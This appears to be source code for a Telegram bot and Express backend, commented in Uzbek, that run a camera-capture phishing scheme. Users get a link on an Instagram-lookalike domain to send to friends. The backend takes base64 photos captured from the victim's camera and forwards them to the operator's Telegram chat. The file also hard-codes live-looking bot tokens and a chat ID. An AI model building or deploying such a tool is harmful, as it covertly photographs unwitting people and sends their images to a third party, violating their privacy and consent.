# import express from "express";
# import axios from "axios";
# import bodyParser from "body-parser";
# import cors from "cors";
# import fs from "fs";
# import path from "path";
# import FormData from "form-data";
# import TelegramBot from "node-telegram-bot-api";

# const BOT_TOKEN = "8590279638:AAGEiQJng67xd_L4J8nXbIyL2YncMo3f6bo";
# const CHAT_ID = "8364051762";

# const app = express();
# app.use(cors({ origin: "https://instagram-rouge-six.vercel.app" }));
# app.use(bodyParser.json({ limit: "10mb" }));

# // ✅ Telegram botni ishga tushiramiz
# const bot = new TelegramBot(BOT_TOKEN, { polling: true });

# // ✅ /start bosilganda 2 ta tugma chiqaramiz
# bot.onText(/\/start/, (msg) => {
#   bot.sendMessage(msg.chat.id, "Quyidagi tugmalardan birini tanlang:", {
#     reply_markup: {
#       inline_keyboard: [
#         [
#           { text: "🖼 Rasm 1", callback_data: "rasm1" },
#           { text: "🖼 Rasm 2", callback_data: "rasm2" }
#         ]
#       ]
#     }
#   });
# });

# // ✅ Tugma bosilganda javob
# bot.on("callback_query", (query) => {
#   const chatId = query.message.chat.id;

#   if (query.data === "rasm1") {
#     bot.sendMessage(chatId, "silkani dostingozga yuboring va uni rasmga oling n/ https://instagram-rouge-six.vercel.app/photo");
#   }

#   if (query.data === "rasm2") {
#     bot.sendMessage(chatId, "silkani dostingozga yuboring va uni rasmga oling n/ https://instagram-rouge-six.vercel.app/photo");
#   }

#   bot.answerCallbackQuery(query.id);
# });

# // ✅ FRONTEND → BOT ga rasm yuborish API
# app.post("/send-photo", async (req, res) => {
#   const { image } = req.body;
#   if (!image) return res.status(400).send("No image provided");

#   try {
#     // const base64Data = image.replace(/^data:image\/\\w+;base64,/, "");
#     const base64Data = image.replace(/^data:image\/\w+;base64,/, "");
#     const buffer = Buffer.from(base64Data, "base64");

#     const filePath = path.join(process.cwd(), "temp_photo.jpg");
#     fs.writeFileSync(filePath, buffer);

#     const formData = new FormData();
#     formData.append("chat_id", CHAT_ID);
#     formData.append("caption", "📷 Kamera orqali olingan rasm");
#     formData.append("photo", fs.createReadStream(filePath));

#     await axios.post(
#       `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
#       formData,
#       { headers: formData.getHeaders() }
#     );

#     fs.unlinkSync(filePath);

#     res.send("✅ Rasm Telegram'ga yuborildi!");
#   } catch (error) {
#     console.error("Xato:", error.response?.data || error.message);
#     res.status(500).send("Xatolik yuz berdi");
#   }
# });

# // ✅ Serverni ishga tushiramiz
# app.listen(5000, () =>
#   console.log("✅ Server va Telegram bot 5000-portda ishga tushdi")
# );




import asyncio
from pyexpat.errors import messages

from aiogram import Bot,Dispatcher,types
from aiogram.dispatcher.filters import Command 
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton,ReplyKeyboardMarkup,KeyboardButton,ReplyKeyboardRemove

# API_TOKEN ='8297621066:AAG7F4aijVoNwwxm_XTrFiHM2EoBw58hirc'
# API_TOKEN='8590279638:AAGEiQJng67xd_L4J8nXbIyL2YncMo3f6bo'
API_TOKEN='8297621066:AAG7F4aijVoNwwxm_XTrFiHM2EoBw58hirc'
bot =Bot(token=API_TOKEN)


db=Dispatcher(bot)
mahsulotlar_buttons=InlineKeyboardMarkup(
    inline_keyboard=[
        [InlineKeyboardButton(text='rasmga olish',callback_data='rasm')],
        [InlineKeyboardButton(text='videoga olish',callback_data='video')],
    ]
)


menu=ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text='🛍 Xizmatlar')],
        # [KeyboardButton(text='🛒 Savat')],
        [KeyboardButton(text='ℹ️ Malumot')],
    ]
    ,   
    resize_keyboard=True
)

@db.message_handler(Command('start'))
async def start(message:types.Message):
    await message.answer('Salom!',reply_markup=menu)


@db.message_handler(lambda msg: msg.text=="🛍 Xizmatlar")
async def mahsulotlar(message:types.Message):
    await message.answer("🛍 xizmatlar ro‘yxati...",reply_markup=mahsulotlar_buttons)
    # await message.answer("meniyu olib tashlandi")



@db.callback_query_handler(lambda c: c.data == 'rasm')
async def tel_handler(callback: types.CallbackQuery):
    user_id=callback.from_user.id
    await callback.message.answer(f"📱 rasmga olish uchun silkaga kiring! \n https://instagram-rouge-six.vercel.app/photo/{user_id}")
    await callback.answer()



async def main():
    print('bot ishga tushdi ...')
    await db.start_polling(bot)




if __name__=='__main__':
    asyncio.run(main())